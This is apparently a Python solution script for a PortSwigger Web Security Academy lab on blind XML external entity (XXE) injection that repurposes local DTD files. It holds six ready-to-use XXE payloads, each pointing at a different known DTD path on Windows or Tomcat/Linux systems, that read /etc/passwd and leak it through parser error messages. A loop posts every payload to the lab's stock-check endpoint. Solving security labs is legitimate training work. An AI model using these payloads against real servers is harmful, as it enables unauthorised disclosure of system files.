# https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd

import requests
from rich.console import Console
import typer
import time


console = Console()


SERVER="https://0a4b00fa03be611fc0702a2c001d003c.web-security-academy.net"
ENDPOINT="/product/stock"

def inject_xml(server, session):
    
    payload1='''<!DOCTYPE message [
        <!ENTITY % local_dtd SYSTEM "file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd">
        <!ENTITY % CIMName '>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>
        %local_dtd;
        ]>'''

    payload2 = '''<!DOCTYPE message [
                <!ENTITY % local_dtd SYSTEM "file:///C:\\Windows\\System32\\wbem\\xml\\wmi20.dtd">
                <!ENTITY % CIMName '>
                <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
                <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
                &#x25;eval;
                &#x25;error;
                <!ELEMENT aa "bb"'>
                %local_dtd;
                ]>'''

    payload3 = '''<!DOCTYPE message [
                <!ENTITY % local_dtd SYSTEM "file:///C:\\Windows\\System32\\xwizard.dtd">
                <!ENTITY % onerrortypes '(aa) #IMPLIED>
                <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
                <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
                &#x25;eval;
                &#x25;error;
                <!ATTLIST attxx aa "bb"'>
                %local_dtd;
                ]>'''

    payload4 = '''<!DOCTYPE message [
                <!ENTITY % local_dtd SYSTEM "file:///usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">
                <!ENTITY % URI '(aa) #IMPLIED>
                <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
                <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
                &#x25;eval;
                &#x25;error;
                <!ATTLIST attxx aa "bb"'>
                %local_dtd;
                ]>'''

    payload5 = '''<!DOCTYPE message [
                <!ENTITY % local_dtd SYSTEM "file:///usr/local/tomcat/lib/tomcat-coyote.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd">
                <!ENTITY % Boolean '(aa) #IMPLIED>
                <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
                <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
                &#x25;eval;
                &#x25;error;
                <!ATTLIST attxx aa "bb"'>
                %local_dtd;
                ]>'''

    payload6 = '''<!DOCTYPE message [
                <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
                <!ENTITY % ISOamso '
                <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
                <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
                &#x25;eval;
                &#x25;error;
                '>
                %local_dtd;
                ]>'''
    
    payloads = [payload1, payload2, payload3, payload4, payload5, payload6]

    for eval in payloads:
        xml='''<?xml version="1.0" encoding="UTF-8"?>
        INJECT-HERE
        <stockCheck>
        <productId>
        1
        </productId>
        <storeId>
        1
        </storeId>
        </stockCheck>'''

        xml=xml.replace("INJECT-HERE", eval)

        response=session.post(f"{server}{ENDPOINT}", data=xml)

        style = "bold white on red"
        if response.status_code == 400:
            console.print("error triggered", style=style, justify="center")
            time.sleep(1)
            console.log(response.text)


def main(server=SERVER):
    session = requests.Session()
    inject_xml(server, session)

if __name__ == "__main__":
    typer.run(main)